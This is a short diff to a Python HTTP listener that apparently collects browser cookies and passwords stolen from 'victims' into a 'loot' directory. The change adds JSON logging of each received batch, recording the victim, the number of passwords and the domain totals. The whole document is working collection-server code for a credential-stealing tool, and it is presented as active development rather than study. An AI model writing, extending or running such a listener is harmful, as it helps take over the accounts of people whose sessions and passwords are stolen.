@@ -25,10 +25,12 @@ from http.server import HTTPServer, BaseHTTPRequestHandler
 
 from cklog import coverage as coveragelib
 from cklog import loot as lootlib
+from cklog import log as loglib
 
 HERE   = os.path.dirname(os.path.abspath(__file__))
 LOOT   = os.path.join(HERE, "loot")
 os.makedirs(LOOT, exist_ok=True)
+JLOG   = loglib.JsonLogger(os.path.join(LOOT, "listener.jsonl"))
 
 # Output files -- separated by type:
 #   all_cookies.json -- actual browser cookies only (no passwords)
@@ -444,6 +446,10 @@ class Handler(BaseHTTPRequestHandler):
             top[d] = top.get(d, 0) + 1
             if c.get("name") == "password":
                 new_pwds += 1
+
+        JLOG.info(event="post_received", victim=victim, records=len(cookies),
+                  passwords=new_pwds, total_cookies=len(all_cookies),
+                  total_passwords=len(passwords), domains=len(top))
 
         print("\n[+] %d entries received from %s (%d passwords) | total: %d cookies, %d passwords, %d session" % (
             len(cookies), victim, new_pwds, len(all_cookies), len(passwords), len(sess_all)))
